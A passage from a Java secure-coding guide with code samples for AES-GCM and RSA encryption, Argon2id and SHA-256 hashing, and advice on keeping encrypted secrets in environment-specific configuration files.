    // attacks that can break AES-256 encryption within a reasonable time frame, even using
    // supercomputers.
    final KeyGenerator keyGenerator = KeyGenerator.getInstance("AES");
    keyGenerator.init(256);
    return keyGenerator.generateKey();
  }

  private static byte[] generateIv() throws Exception {
    // Note: IV (Initialization Vector) is used in encryption algorithms, particularly in modes that
    // provide authenticated encryption like AES/GCM, to ensure uniqueness and security of the
    // encryption process. The IV adds randomness to the encryption process, ensuring that the same
    // plaintext encrypted multiple times with the same key will produce different ciphertexts.
    final byte[] iv = new byte[12];
    final SecureRandom random = new SecureRandom();
    random.nextBytes(iv);
    return iv;
  }

  private static void encryptFile(
      String filePath, String encryptedFilePath, SecretKey secretKey, byte[] iv) throws Exception {
    // Using AES/GCM/NoPadding is in line with OWASP recommendations for the authenticated
    // encryption.
    final Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
    cipher.init(Cipher.ENCRYPT_MODE, secretKey, new GCMParameterSpec(128, iv));

    try (final FileInputStream fileInputStream = new FileInputStream(filePath);
        final FileOutputStream fileOutputStream = new FileOutputStream(encryptedFilePath);
        final CipherOutputStream cipherOutputStream =
            new CipherOutputStream(fileOutputStream, cipher)) {

      final byte[] buffer = new byte[1024];
      int bytesRead;

      while ((bytesRead = fileInputStream.read(buffer)) != -1) {
        cipherOutputStream.write(buffer, 0, bytesRead);
      }
    }
  }

  private static void decryptFile(
      String encryptedFilePath, String decryptedFilePath, SecretKey secretKey, byte[] iv)
      throws Exception {
    final Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
    cipher.init(Cipher.DECRYPT_MODE, secretKey, new GCMParameterSpec(128, iv));

    try (final FileInputStream fileInputStream = new FileInputStream(encryptedFilePath);
        final FileOutputStream fileOutputStream = new FileOutputStream(decryptedFilePath);
        final CipherInputStream cipherInputStream =
            new CipherInputStream(fileInputStream, cipher)) {

      final byte[] buffer = new byte[1024];
      int bytesRead;
      while ((bytesRead = cipherInputStream.read(buffer)) != -1) {
        fileOutputStream.write(buffer, 0, bytesRead);
      }
    }
  }
```

Sources:
- [FileEncryption.java](https://github.com/ionutbalosin/java-application-security-practices/blob/main/encryption-decryption/src/main/java/ionutbalosin/training/application/security/practices/encryption/decryption/symetric/FileEncryption.java)
- [FileDecryption.java](https://github.com/ionutbalosin/java-application-security-practices/blob/main/encryption-decryption/src/main/java/ionutbalosin/training/application/security/practices/encryption/decryption/symetric/FileDecryption.java)

### Asymmetric Encryption

Asymmetric encryption uses a pair of keys: a public key and a private key. 
The public key can be shared publicly over the internet or other channels, but the private key must be kept secret.

#### When to Use It

- **Key Exchange**: Asymmetric encryption is often used to securely exchange keys for symmetric encryption. For example, during the TLS/SSL handshake, asymmetric encryption is used to exchange a symmetric key securely.
- **Digital Signatures**: Asymmetric encryption is used to create and verify digital signatures, ensuring the authenticity and integrity of messages.
- **Secure Communication**: Applications such as secure email with Pretty Good Privacy (PGP) use asymmetric encryption to ensure that only the intended recipient can decrypt the message.
- **Digital Certificates**: Asymmetric encryption is used in digital certificates to verify the identity of entities.

#### What Algorithms to Use

There are multiple asymmetric algorithms, such as Rivest-Shamir-Adleman (RSA), Curve25519, and ElGamal. However, there are a few considerations for each:
- **RSA**: OWASP recommends RSA with `2048-bit` keys or higher, as it offers a high degree of security. It is probably the most widely used algorithm, but it is computationally expensive.
- **Curve25519**: An elliptic curve cryptography (ECC) algorithm that is much faster and more efficient in terms of computational resources compared to RSA, even with shorter key lengths. This makes it very useful in resource-constrained environments such as IoT or blockchain systems.
- **ElGamal**: Faster than RSA but less secure. Its security depends significantly on key sizes, and it is generally recommended to use it with `2048-bit` keys or higher.
- **DSA (Digital Signature Algorithm)**: Primarily used for digital signatures, ensuring message authenticity and integrity. While not deprecated, it is less favored in modern cryptographic practices.

Below is an example of encrypting and decrypting a text message using RSA `2048-bit` key:

```java
  private static KeyPair generateKeyPair() throws Exception {
    // Generate RSA key pair with 2048-bit key size
    final KeyPairGenerator keyPairGenerator = KeyPairGenerator.getInstance("RSA");
    keyPairGenerator.initialize(2048);
    return keyPairGenerator.generateKeyPair();
  }
  
  private static byte[] encryptMessage(byte[] message, PublicKey publicKey) throws Exception {
    // Note: RSA can only encrypt data smaller than the key size minus padding overhead.
    // For a 2048-bit key and PKCS1 padding, this is generally less than 254 bytes.
    final Cipher cipher = Cipher.getInstance("RSA/ECB/PKCS1Padding");
    cipher.init(Cipher.ENCRYPT_MODE, publicKey);

    return cipher.doFinal(message);
  }

  private static byte[] decryptMessage(byte[] encryptedMessage, PrivateKey privateKey)
        throws Exception {
    final Cipher cipher = Cipher.getInstance("RSA/ECB/PKCS1Padding");
    cipher.init(Cipher.DECRYPT_MODE, privateKey);

    return cipher.doFinal(encryptedMessage);
  }  
```

Source: [MessageEncryptDecrypt.java](https://github.com/ionutbalosin/java-application-security-practices/blob/main/encryption-decryption/src/main/java/ionutbalosin/training/application/security/practices/encryption/decryption/asymetric/MessageEncryptDecrypt.java)

In summary, Java applications should use recommended, non-deprecated, and robust encryption algorithms to maintain data integrity and confidentiality. Continuous monitoring and updating of encryption algorithms are essential, as what is secure today may become vulnerable in the future.

## Hashing

A hash function is a mathematical function that takes an input and produces a fixed-size string of characters, typically a combination of letters and numbers. The output, known as the hash value or hash code, is unique to the input and is designed to be one-way, meaning it is computationally infeasible to reverse-engineer the original input from the hash value.

### When to Use It
- **Password Storage**: Hash functions are recommended for securely storing passwords. Instead of storing passwords in plaintext, they are hashed and the hash values are stored. During authentication, the provided password is hashed and compared to the stored hash.
- **Data Integrity**: Hash functions can be used to verify the integrity of data by comparing hash values before and after transmission or storage.

### What Hash Functions to Use
- **Argon2**: Considered the most secure hashing algorithm, with variants `Argon2d`, `Argon2i`, and `Argon2id`. **OWASP recommends Argon2id for password storage**.
- **Scrypt**: A strong alternative to Argon2, recommended by OWASP with specific parameters for CPU/memory cost, block size, and parallelism.
- **bcrypt**: Another widely used hashing algorithm, recommended with a work factor of at least `10`.
- **PBKDF2**: Recommended for `FIPS-140` compliance, with specific iteration counts for different hashing algorithms (e.g., `PBKDF2-HMAC-SHA256` with `600,000` iterations; `PBKDF2-HMAC-SHA512` with `210,000` iterations).
- **SHA-256**: Recommended by OWASP for message integrity checks, such as verifying file integrity, ensuring data authenticity in digital signatures, and detecting unauthorized modifications in transmitted data.

### What Hash Functions to Avoid
- **SHA1** and **MD5**: Deprecated and considered insecure due to vulnerabilities and susceptibility to collision attacks.

### Best Practices for Hashing
- **Salting**: Add a unique, randomly generated salt to each password before hashing to enhance security and prevent rainbow table attacks.
- **Iteration Count**: Use a high number of iterations to make the hashing process more resource-intensive and resistant to brute-force attacks.

Below is an example of hashing a password using Argon2 with a salt and an iteration count:

```java
  private static byte[] hashPassword(
      String password, byte[] salt, int iterations, int memory, int parallelism, int hashLength) {
    final Argon2Parameters.Builder builder =
        new Argon2Parameters.Builder(Argon2Parameters.ARGON2_id)
            .withSalt(salt)
            .withIterations(iterations)
            .withMemoryAsKB(memory)
            .withParallelism(parallelism);

    final Argon2BytesGenerator generator = new Argon2BytesGenerator();
    generator.init(builder.build());

    final byte[] hash = new byte[hashLength];
    generator.generateBytes(password.toCharArray(), hash);

    return hash;
  }
```

Below is an example of hashing data using SHA-256:

```java
  public static byte[] hashData(byte[] data) throws NoSuchAlgorithmException {
    final MessageDigest digest = MessageDigest.getInstance("SHA-256");
    return digest.digest(data);
}
```

Sources:
- [PasswordHashing.java](https://github.com/ionutbalosin/java-application-security-practices/blob/main/encryption-decryption/src/main/java/ionutbalosin/training/application/security/practices/encryption/decryption/hashing/PasswordHashing.java)
- [MessageHashing.java](https://github.com/ionutbalosin/java-application-security-practices/blob/main/encryption-decryption/src/main/java/ionutbalosin/training/application/security/practices/encryption/decryption/hashing/MessageHashing.java)

In summary, Java applications should use recommended, non-deprecated, and robust hashing functions to maintain data integrity. Continuous monitoring and updating of hashing functions are essential, as what is secure today may become vulnerable in the future.

## Secure Configuration and Secrets Management

All application secrets (e.g., sensitive configuration values such as API keys, database credentials, etc.) should never be stored unencrypted (or unencoded) within the application code (i.e., in plain text). 
Instead, the application should define them as key-value properties, and their encrypted (and encoded) values must be resolved and replaced during the deployment pipeline for the specific target environment.

> Storing secrets unencrypted or in plain text within the source code is a critical security risk and must be strictly avoided. Use secrets management services and environment variables to securely handle sensitive information.

Example of application configuration properties:

```properties
# IdP configuration properties
spring.security.oauth2.resourceserver.opaque.introspection-uri=${INTROSPECTION_URL}
spring.security.oauth2.resourceserver.opaque.introspection-client-id=${INTROSPECTION_CLIENT_ID}
spring.security.oauth2.resourceserver.opaque.introspection-client-secret=${INTROSPECTION_CLIENT_SECRET}

# Database configuration properties
spring.datasource.driver-class-name=org.postgresql.Driver
spring.datasource.url=jdbc:postgresql://my-application-${ENV}:5432/application_db
spring.datasource.username=${DATABASE_USERNAME}
spring.datasource.password=${DATABASE_PASSWORD}
spring.datasource.platform=postgres
spring.datasource.sql-script-encoding=UTF-8
```

Now, let's imagine the application is deployed to `DEV`, `SIT`, `UAT`, and `PROD` environments. Therefore, different sets of key-value properties must be made available, one for each environment.

Following the [config as code](https://en.wikipedia.org/wiki/Infrastructure_as_code) approach, all environment-specific (and sensitive) properties must be stored and versioned in different environment-specific files. For example:

```properties
# DEV properties file
ENV=dev
INTROSPECTION_URL=http://idp.dev:9090/realms/master/protocol/openid-connect/token/introspect
INTROSPECTION_CLIENT_ID=dev-client-id
# Encoded (Base64) and encrypted (AES-256) client secret
INTROSPECTION_CLIENT_SECRET=BQICAHhdAZtTNcAIHM7Rz12717mWM7CpWd0IGxheREGppvO+JQE90==
DATABASE_USERNAME=dev-db-user
# Encoded (Base64) and encrypted (AES-256) database password
DATABASE_PASSWORD=M7CAHg2cxBsFur/NflLQ09GZpLdFqJB34koyAuTfD+zEObj8AFAE8b9eET9ew/6ja==
```

Similar properties files will be created for other environments such as `SIT`, `UAT`, and `PROD`, usually by DevOps or developers.

As illustrated in the example, the crucial thing is that all the secrets (e.g., `INTROSPECTION_CLIENT_SECRET`, `DATABASE_PASSWORD`) are encoded and encrypted. 
Therefore, even if they are seen by unauthorized users, their real values cannot be decoded without the decryption key. 
The decryption key should only be accessible in the specific environment (e.g., `DEV`, `SIT`, `UAT`, and `PROD`) and not available to unauthorized individuals.

All sensitive and encrypted properties should be decrypted during deployment using the decryption keys available in the environment, as highlighted in the diagram below. For example, if using an AWS account, Amazon Key Management Service (KMS) can be used to store and manage both the encryption and decryption keys.
The implementation details at the infrastructure level, including generating, storing, and rotating the keys, as well as encrypting and decrypting the secrets, are beyond the scope of this article.

[![Secure Configuration and Secrets Management.svg](https://github.com/ionutbalosin/java-application-security-practices/blob/main/docs/images/secure_configuration_and_secrets_management.svg?raw=true)](https://github.com/ionutbalosin/java-application-security-practices/blob/main/docs/images/secure_configuration_and_secrets_management.svg?raw=true)

In summary, never store secrets in plain text or unencrypted form alongside the source code.

## Keeping JDK Versions and Libraries Up to Date

Regularly updating your JDK and dependencies is essential for security. New versions often include critical security patches and enhancements that protect against vulnerabilities. Despite its simplicity, this practice is frequently overlooked by developers.

Neglecting dependency updates should be avoided, except in rare cases (e.g., legacy applications with unsupported libraries). In most cases, upgrading to a newer minor version is straightforward and requires minimal effort.

## References

- [Application Security for Java Developers Course](https://ionutbalosin.com/training/application-security-for-java-developers-course) – Level up your Java security skills! 🎓 🚀
- [Java Application Security Practices](https://github.com/ionutbalosin/java-application-security-practices) - GitHub source code
- [Serialization and deserialization in Java: explaining the Java deserialize vulnerability](https://snyk.io/blog/serialization-and-deserialization-in-java/)
- [Explaining Java Deserialization Vulnerabilities (Part 1)](https://foojay.io/today/explaining-java-deserialization-vulnerabilities-part-1/)
- [Explaining Java Deserialization Vulnerabilities (Part 2)](https://foojay.io/today/explaining-java-deserialization-vulnerabilities-part-2/)
- [Yaml Bomb](https://github.com/dubniczky/Yaml-Bomb)
- [Preventing YAML parsing vulnerabilities with snakeyaml in Java](https://snyk.io/blog/java-yaml-parser-with-snakeyaml)
- [A better zip bomb](https://www.bamsoftware.com/hacks/zipbomb)
- [42 zip](https://unforgettable.dk/)
- [Cryptographic Storage Cheat Sheet](https://owasp.deteact.com/cheat/cheatsheets/Cryptographic_Storage_Cheat_Sheet.html)
- [Securing symmetric encryption algorithms in Java](https://snyk.io/blog/symmetric-encryption-algorithms-java)
- [Cross-site scripting (XSS)](https://en.wikipedia.org/wiki/Cross-site_scripting)
- [SQL injection](https://en.wikipedia.org/wiki/SQL_injection)
- [Denial-of-service attack](https://en.wikipedia.org/wiki/Denial-of-service_attack)
- [Path traversal attacks](https://owasp.org/www-community/attacks/Path_Traversal)
- [Universally Unique Identifier (UUID)](https://en.wikipedia.org/wiki/Universally_unique_identifier)
- [Personally Identifiable Information (PII)](https://www.investopedia.com/terms/p/personally-identifiable-information-pii.asp)
- [General Data Protection Regulation](https://gdpr-info.eu)
- [Mapped Diagnostic Context (MDC)](https://logback.qos.ch/manual/mdc.html)
